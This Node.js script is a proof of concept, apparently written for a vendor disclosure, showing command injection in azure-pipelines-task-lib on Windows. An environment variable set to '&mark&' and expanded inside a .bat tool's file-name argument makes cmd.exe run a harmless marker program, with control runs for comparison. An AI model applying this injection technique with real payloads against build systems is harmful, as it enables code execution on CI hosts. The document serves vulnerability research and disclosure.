// AndroidSigningV3 / azure-pipelines-task-lib: the percent sign on a .bat command line.
// Runs on a real Windows host with the published library, a real .bat tool and real cmd.exe.
// Synthetic marker only: the injected command is mark.exe, which writes PWNED-<id>.txt.
const fs = require('fs');
const os = require('os');
const path = require('path');
const trm = require('azure-pipelines-task-lib/toolrunner');

const WORK = process.argv[2];
const MARKER_ID = process.env.MSRC_MARKER_ID;
const tlver = require('azure-pipelines-task-lib/package.json').version;
console.log('azure-pipelines-task-lib : ' + tlver);
console.log('node                     : ' + process.version);
console.log('platform                 : ' + process.platform);
console.log('workdir                  : ' + WORK);

// Print the quoting table straight out of the shipped source.
const trSrc = fs.readFileSync(require.resolve('azure-pipelines-task-lib/toolrunner.js'), 'utf8');
const m = trSrc.match(/cmdSpecialChars\s*=\s*(\[[^\]]*\])/);
console.log('shipped cmdSpecialChars  : ' + (m ? m[1] : 'NOT FOUND'));
console.log('percent sign present     : ' + (m ? m[1].indexOf("'%'") !== -1 : 'unknown'));

const BAT = path.join(WORK, 'apksigner.bat');
const EXE = path.join(WORK, 'zipalign.exe');
fs.writeFileSync(BAT, '@echo off\r\necho APKSIGNER.BAT RAN\r\necho APKSIGNER.BAT ARGS=%*\r\n');

function signArgs(apkPath) {
    return ['sign', '--ks', path.join(WORK, 'release.keystore'),
            '--ks-pass', 'pass:S3cretKeystorePassword',
            '--ks-key-alias', 'release',
            '--verbose',
            apkPath];
}

function markerPath() { return path.join(WORK, 'PWNED-' + MARKER_ID + '.txt'); }
function clearMarker() { try { fs.unlinkSync(markerPath()); } catch (e) {} }

function leg(label, tool, args) {
    clearMarker();
    const tr = new trm.ToolRunner(tool);
    tr.arg(args);
    const opts = { cwd: WORK, env: process.env, silent: true, failOnStdErr: false, ignoreReturnCode: true };
    console.log('\n================ ' + label);
    console.log('  tool                   : ' + path.basename(tool));
    console.log('  last argv in           : ' + args[args.length - 1]);
    console.log('  BUILD_SOURCEVERSIONMESSAGE = ' + JSON.stringify(process.env.BUILD_SOURCEVERSIONMESSAGE));
    console.log('  spawn file             : ' + path.basename(tr._getSpawnFileName(opts)));
    console.log('  windowsVerbatimArguments: ' + tr._getSpawnSyncOptions(opts).windowsVerbatimArguments);
    const spawnArgs = tr._getSpawnArgs(opts);
    console.log('  command line to CreateProcess:');
    console.log('    ' + spawnArgs.join(' ').split(WORK).join('<work>'));
    const r = tr.execSync(opts);
    console.log('  exit code              : ' + r.code);
    (r.stdout || '').split(/\r?\n/).filter(s => s.trim()).forEach(s => console.log('  out> ' + s.trim().split(WORK).join('<work>')));
    (r.stderr || '').split(/\r?\n/).filter(s => s.trim()).forEach(s => console.log('  err> ' + s.trim().split(WORK).join('<work>')));
    const fired = fs.existsSync(markerPath());
    console.log('  MARKER FILE WRITTEN    : ' + fired);
    if (fired) console.log('  marker contents        : ' + fs.readFileSync(markerPath(), 'utf8').trim().split(/\r?\n/).join(' | ').split(WORK).join('<work>'));
    return fired;
}

const ORDINARY  = 'D:\\a\\1\\s\\app-release.apk';
const AMPERSAND = 'D:\\a\\1\\s\\app&mark&.apk';
const PERCENT   = 'D:\\a\\1\\s\\app%BUILD_SOURCEVERSIONMESSAGE%.apk';

process.env.BUILD_SOURCEVERSIONMESSAGE = '&mark&';

const r1 = leg('CONTROL 1  ordinary file name, .bat tool', BAT, signArgs(ORDINARY));
const r2 = leg('CONTROL 2  the marker command written DIRECTLY into the file name, .bat tool', BAT, signArgs(AMPERSAND));
const r3 = leg('INJECT     the marker command delivered THROUGH %BUILD_SOURCEVERSIONMESSAGE%, .bat tool', BAT, signArgs(PERCENT));

// Control 4 needs a real .exe so the non-batch branch runs.
fs.copyFileSync(path.join(WORK, 'argvdump.exe'), EXE);
const r4 = leg('CONTROL 4  same file name, .exe tool (the zipalign leg of the same task)', EXE, ['-v', '4', PERCENT, PERCENT]);

console.log('\n================ SUMMARY');
console.log('  CONTROL 1 ordinary name              marker=' + r1);
console.log('  CONTROL 2 & written into the name    marker=' + r2 + '   (quoted by _windowsQuoteCmdArg, inert)');
console.log('  INJECT    & delivered via %VAR%      marker=' + r3);
console.log('  CONTROL 4 .exe tool, same name       marker=' + r4 + '   (array passthrough, cmd.exe never involved)');
process.exit(0);
